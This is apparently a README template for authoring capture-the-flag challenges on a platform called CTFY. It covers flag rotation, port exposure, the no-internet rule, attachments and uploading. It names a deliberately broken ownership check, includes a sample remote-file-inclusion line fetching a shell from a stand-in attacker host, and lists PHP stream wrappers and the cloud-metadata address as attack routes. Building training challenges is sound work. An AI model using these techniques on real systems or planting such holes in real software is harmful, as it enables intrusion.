# my-challenge

This tree already works: `docker compose up` starts it,
`solution/exploit.py` solves it, `challenge audit` is clean.
**Everything here is a placeholder. Replace it.**

## What to change

1. `metadata.yaml` — name, description, tags.
2. `services/app/` — a note view that never checks who owns the row.
3. `solution/exploit.py` — the discovery path.

## The one wiring worth understanding

The platform mints a fresh answer per team and per instance. It reaches
your challenge through the `flag-rotator` sidecar, which writes it to a
shared volume that `docker-compose.yml` mounts read-only at
`/answers/flag`.

The service image links `/flag` to that file
(`RUN ln -s /answers/flag /flag` in its Dockerfile), so the service reads
`/flag` at request time, and so does a player who gets a
shell, as on most CTF platforms. A challenge brought over from CTFd that
reads `/flag` needs no path change.

**More than one question?** One `/flag` cannot hold several
answers. Each question's answer is at `/answers/<question id>`: add a line
to `services/flag-rotator/rotate.sh` and a mount per id, and say in the
description where each answer lives.

That is why the answer is never a literal in your source.

## How players reach your challenge

**The service that has `ports:` in `docker-compose.yml` is the entry.**
When a team starts the box the platform removes every `ports:` line and
gives each service that had one a random host name on its ingress, served
over `https://`. The player is handed that URL; you never write it.

- **Put `ports:` on exactly the services players should reach**, and
  nowhere else. The flag rotator, a database and any backend only your
  app talks to must not have one.
- **The container port is what matters.** In `"80:8080"` the right-hand
  `8080` is the port your service listens on inside the container; the
  host side is discarded at start. Writing a port your app does *not*
  listen on is the usual reason a box is "ready" and serves nothing.
- **Several services with `ports:` are several entries** (an app plus a
  fake registry, say). That is allowed, but each is a separate address
  the player must be told about.
- **`entry_urls:` in `metadata.yaml` is optional.** It does not create an
  entry; it only lists where to *start* (`http://target/admin/login`).
  Each item is an absolute `http(s)://` URL (META013) and the panel shows
  it as a link. Leave it out unless the player would otherwise have to
  guess a path.
- **No `ports:` at all** is the audit's `COMPOSE003`: the box would have
  nothing to hand a player.

Clauses: CTFY-0002 §3.6 (network topology), §2.1 (`entry_urls`), §3.4
(`ports:` is rewritten at start). Audit codes: `COMPOSE003`, `META013`,
`STRUCT012`, `STRUCT013`.

## No internet while it runs

Assume **the challenge has no internet access while it is running.** Many
competitions (and the TPCTF rules) forbid it, and a box that quietly
depends on egress starts fine and then cannot be solved during the event.

- **Real RFI does not work.** `include "http://attacker/shell.txt"` needs
  the box to reach the internet. Use a local stream wrapper instead —
  `data://text/plain;base64,...`, `php://input`, `php://filter` — which
  is the technique a no-internet RFI challenge is really testing.
- **Outbound SSRF cannot reach a real external service.** Point the
  victim at an in-estate target (another service in your compose, the
  cloud-metadata address `169.254.169.254` a sidecar mimics, …), never at
  a host on the internet.
- **No runtime downloads.** Anything your service needs — a wordlist, a
  binary, a dependency — is baked into the image at build time or served
  by a sibling service, never `curl`ed from the internet when a player
  starts the box. (A build *may* reach its base image; a running box does
  not. See `services/*/Dockerfile`.)
- **An AI-security challenge must not depend on a platform-provided
  model.** None is supplied to an uploaded challenge at runtime: the model
  the player attacks runs inside your compose, or is simulated there.
- Your **reference exploit** runs under the same rule: it may only reach
  the target it is given, not the internet.
- **If the challenge really needs the internet**, say so in
  `docker-compose.yml`, with the reason players and organisers are shown:

  ```yaml
  x-ctfy-internet:
    required: true
    reason: "calls the public GitHub API to fetch a release"
  ```

  It is a request, not a switch: a competition that forbids the internet
  still runs the box without it, and the organiser and you are told about
  the conflict when you upload.

## Attachments

Anything under `attachments/` is downloadable at
`/challenges/<id>/attachments/<name>`. One decision: **does this
artifact contain anything specific to the team that downloads it?**

- Yes — name it `<name>.tpl` and reference `{{ answer.<question id> }}`
  inside. The node renders it per instance, so every team gets
  different bytes.
- Yes, and it is compiled — let an `attachment-builder` service build it
  from source per instance; the `reverse` template is the worked example.
- No — ship a plain file.

⚠️ An executable you compiled yourself is reviewed as one before it is
published — a platform admin cannot read inside it. Source the platform
builds is reviewed as source.

⚠️ A static artifact carrying the answer is the shape to avoid: one
team posts the file and the rest submit without opening it.

Subdirectories work: `attachments/tools/linux/solver` is served as
`tools/linux/solver`, and a `.tpl` renders in place wherever it sits.
What is never served, from this tree or from what a builder writes:

- a symlink (even one pointing inside `attachments/`), a hard link, a
  FIFO, a socket or a device — ship the file itself;
- a hidden name (`.git/`, `.env`, `.notes.swp`) at any level;
- a name with a control character, a text-direction override or a
  backslash;
- a name more than 16 levels deep, more than 2000 files,
  or files over the upload's own size limits.

An upload carrying any of these is refused with the reason, and
`ctfy authoring check` says so before you upload; a builder that
writes one gets it skipped, never served.

## Uploading from an agent

Over the **remote MCP endpoint** (`/api/v1/mcp`), pack the tree on your own
machine and send it as `archive_base64`; do not send source in `files`:

    tar czf - <dir> | base64 -w0

The remote server cannot read your disk, and exploit source sent as plain
text can be blocked by a network filter in front of the platform. A local
stdio `ctfy mcp` takes the directory as `path` instead, and
`ctfy authoring upload` sends the same archive as a file. The same applies
to `check_authored_challenge` and `revise_authored_challenge`.

## The standard

Every rule this tree must satisfy is one standard, **CTFY-0002 v2** — the
challenge package standard, published at `/docs/standards/CTFY-0002` on the
platform you upload to. This file names what to change; the standard
says what is checked, and why. Start with:

- §2 — `metadata.yaml`: the keys, how a question's mode is read, the ids.
- §4 — how each team's answers reach the box.
- §6 — the reference solution's contract (`<host> <port>` in,
  `Q[<question_id>]: <value>` out) and how a smoke runs it, in any
  language through `solution/Dockerfile`. `solution/exploit.py` runs from
  `/ctfy/work`; a `solution/Dockerfile` image is handed no copy of this
  tree, so it `COPY`s its own code (§6.3).
- §7 — what the box and the solution can reach, and the size limits.
- Appendix — every audit rule code and every refusal, with its clause.

`ctfy authoring check <dir>` checks this tree against it on your
machine; `ctfy authoring smoke --local <dir>` runs the whole loop the
way a reviewer will.
